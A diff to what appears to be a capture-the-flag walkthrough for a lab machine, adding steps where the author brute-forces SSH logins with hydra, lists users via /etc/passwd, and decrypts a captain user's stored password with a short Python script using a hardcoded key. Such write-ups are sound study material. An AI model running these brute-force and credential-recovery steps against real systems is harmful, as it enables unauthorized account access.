@@ -135,7 +135,37 @@ Now, we have decrypted passwords and logins. Don't forget about open ssh port. I
 ```
 hydra -L logins.txt -P passwords.txt -o found.txt 192.168.88.226 ssh
 ```
-FOUND LOGIN FOR commando!
+FOUND LOGIN FOR commando! But this user doesn't have user.txt...
 
+### Switch user:
+
+Just do `ls /home` or `cat /etc/passwd` to see another users. It is a `captain` user!
+Go to home directory of the user and we see there within `Desktop` file 'user.txt' and interesting folder '.crypt'.
+
+![.crypt](screenshots/crypt.png)
+
+readme.txt says that root create a tool to encrypt password for account. Source code of encrypt.py:
+```
+from simplecrypt import encrypt, decrypt
+import os
+import base64
+key = 'sekret'
+password = '<REMOVED FOR SECURITY REASON>'
+ciphertext = encrypt(key,password)
+encoded = base64.b64encode(ciphertext)
+print(encoded)
+```
+File .c has an encrypted password for captain. My script to decrypt it:
+```
+from simplecrypt import encrypt, decrypt
+import os
+import base64
+key = 'sekret'
+encoded = open('/home/captain/Desktop/.crypt/.c', 'rb').read()[2:-2]
+password = base64.b64decode(encoded)
+plaintext = decrypt(key, password)
+print(plaintext)
+```
+Now, we have a captain and user.txt.
 
 ## Post exploitation
